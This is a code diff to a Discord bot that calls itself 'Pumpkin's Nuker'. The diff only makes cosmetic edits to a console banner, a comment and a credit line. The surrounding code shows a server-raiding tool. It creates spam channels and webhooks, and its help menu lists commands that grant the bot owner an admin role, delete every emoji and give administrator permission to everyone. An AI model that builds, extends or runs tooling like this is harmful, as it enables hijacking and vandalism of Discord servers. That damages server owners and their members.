@@ -46,7 +46,7 @@ async def on_ready():
     print(Style.BRIGHT + Fore.LIGHTYELLOW_EX, "\n\n\t\tDone...", Style.RESET_ALL)
     await asyncio.sleep(1)
     banner()
-    print("\n", Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTCYAN_EX, "- " * 4, f"Logged in as {bot.user}", "- " * 4 + Style.RESET_ALL, Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL)
+    print("\n", Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTCYAN_EX, "- " * 6, f"Logged in as {bot.user}", "- " * 6 + Style.RESET_ALL, Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL)
     print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "[+]" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTYELLOW_EX, f"Prefix: {bot.command_prefix}" + Style.RESET_ALL)
     print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "[+]" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTYELLOW_EX, f"Total servers: {len(bot.guilds)}" + Style.RESET_ALL)
     print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "↓" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTGREEN_EX, "Connected Servers: " + Style.RESET_ALL)
@@ -154,7 +154,7 @@ async def create_channel(guild, channel_name, webhook_names, webhook_list, delet
         deleted_channels.append(channel.name)
         print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')
 
-        webhook = await create_webhook_with_delay(channel, random.choice(webhook_names), delay=5)  # Add a 5-second delay between webhook creations
+        webhook = await create_webhook_with_delay(channel, random.choice(webhook_names), delay=5)  
         webhook_list.append(webhook)
         print("\n", Fore.GREEN + '[✓]' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')
 
@@ -326,7 +326,7 @@ async def cmd(ctx):
     embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
     embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
     embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
-    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
+    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by Pumpkin\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
 
